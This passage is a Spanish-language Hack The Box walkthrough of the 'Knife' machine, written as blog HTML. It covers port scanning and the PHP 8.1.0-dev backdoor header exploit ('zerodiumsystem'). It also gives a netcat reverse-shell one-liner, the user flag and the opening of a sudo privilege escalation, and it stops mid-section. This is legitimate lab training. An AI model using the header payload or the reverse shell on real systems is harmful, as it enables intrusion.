&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/347&#34;&gt;Knife&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.242&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/98767&#34;&gt;MrKN16H7&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/98767&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[4.4, 3.8, 4.9, 5.1, 6.2],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;RECON&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Wed May 26 19:44:57 2021 as: nmap -Pn -sV -sC -p22,80 -oN scan_ports 10.10.10.242&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.242 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.242&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.098s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title:  Emergent Medical Idea
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed May 26 19:45:11 2021 -- 1 IP address (1 host up) scanned in 13.39 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina aparentemente estatica.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/knife/Screenshot_20210526_184143.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, pero solo muestra una direccion ya conocida y otra, que no podemos acceder de formar remota.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/knife ❯ gobuster dir -u http://10.10.10.242/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; -x php,html,txt,json,xml
/index.php            &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 5815&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
/server-status        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 277&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;headers&#34;&gt;HEADERS&lt;/h2&gt;
&lt;p&gt;En los headers del sitio encontramos &lt;code&gt;PHP/8.1.0-dev&lt;/code&gt;, al investigar esta version vemos un &lt;a href=&#34;https://packetstormsecurity.com/files/162749/php_8.1.0-dev.py.txt&#34;&gt;exploit&lt;/a&gt; que permite la ejecucion de comandos a traves de un Header el cual esta relacionado a un &lt;a href=&#34;https://www.welivesecurity.com/la-es/2021/03/30/atacantes-vulneraron-repositorio-git-php-colocaron-backdoor-codigo-fuente/&#34;&gt;backdoor&lt;/a&gt; que recientemente fue detectado en un &lt;a href=&#34;https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a&#34;&gt;commit&lt;/a&gt; del repositorio de PHP en desarrollo, lo que permite ejecutar comandos de forma remota.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
Date: Thu, &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 00:22:54 GMT
Server: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---james&#34;&gt;USER - JAMES&lt;/h1&gt;
&lt;p&gt;La ejecucion de comandos se dá tras enviar un comando en el header &lt;code&gt;User-Agentt: zerodiumsystem(&#39;whoami&#39;);&lt;/code&gt; con lo cual se logra ejecutar comandos y muestra su salida. En la salida de curl vemos la ejecucion del comando &lt;code&gt;whoami&lt;/code&gt; al usuario &amp;ldquo;James&amp;rdquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/knife ❯ curl -s http://10.10.10.242/ -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;User-Agentt: zerodiumsystem(&amp;#39;whoami&amp;#39;);&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; html2text
james
    * About EMA
    * /
    * Patients
    * /
    * Hospitals
    * /
    * Providers
    * /
    * E-MSO

***** At EMA we&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;re taking care to a whole new level . . . *****
****** Taking care of our  ******
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos una shell inversa y logramos obtener una shell y la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 8081 &amp;gt;/tmp/f&lt;/span&gt;
james@knife:/$ whoami
whoami
james
james@knife:/$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt;
james@knife:~$ ll
ll
total &lt;span class=&#34;m&#34;&gt;40&lt;/span&gt;
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; james james &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 13:20 ./
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root  root  &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 14:44 ../
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; james james    &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 16:23 .bash_history -&amp;gt; /dev/null
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; james james  &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; .bash_logout
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; james james &lt;span class=&#34;m&#34;&gt;3771&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; .bashrc
drwx------ &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; james james &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 14:45 .cache/
drwxrwxr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; james james &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 16:32 .local/
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; james james  &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; .profile
-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; james james   &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt; May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:16 .selected_editor
drwx------ &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; james james &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 13:20 .ssh/
-r-------- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; james james   &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 20:25 user.txt
james@knife:~$ cat user.txt
cat user.txt
7b3e1804cce95710f8730ca6fb1a086f
james@knife:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Ejecutando &lt;code&gt;sudo -l -l&lt;/code&gt; vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;a href=&#34;https://docs.chef.io/workstation/knife/&#34;&gt;&lt;code&gt;knife&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
